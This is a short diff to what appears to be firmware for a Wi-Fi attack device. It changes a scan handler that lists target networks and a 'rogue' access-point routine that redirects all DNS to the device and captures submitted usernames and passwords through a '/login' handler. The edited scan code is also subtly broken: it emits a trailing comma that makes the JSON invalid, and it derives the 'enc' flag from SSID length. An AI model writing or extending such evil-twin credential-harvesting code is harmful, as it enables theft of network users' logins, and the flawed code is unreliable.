@@ -176,7 +176,7 @@ void handleScan() {
     json += "\"bssid\":\"" + targets[i].bssid + "\",";
     json += "\"rssi\":" + String(targets[i].rssi) + ",";
     json += "\"ch\":" + String(targets[i].ch) + ",";
-    json += "\"enc\":" + (targets[i].ssid.length() > 0 ? "1" : "0");
+    json += "\"enc\":" + String(targets[i].ssid.length() > 0 ? 1 : 0) + ",";
     json += "}";
   }
   json += "]";
@@ -262,7 +262,7 @@ void handleRogueStart() {
     dns.setErrorReplyCode(DNSReplyCode::NoError);
     dns.start(53, "*", apIP);
     
-    server.on("/login", HTTP_POST, []() {
+    server.on("/login", HTTP_POST, [&]() {
       String user = server.arg("user");
       String pass = server.arg("pass");
       prefs.begin("netherx", true);
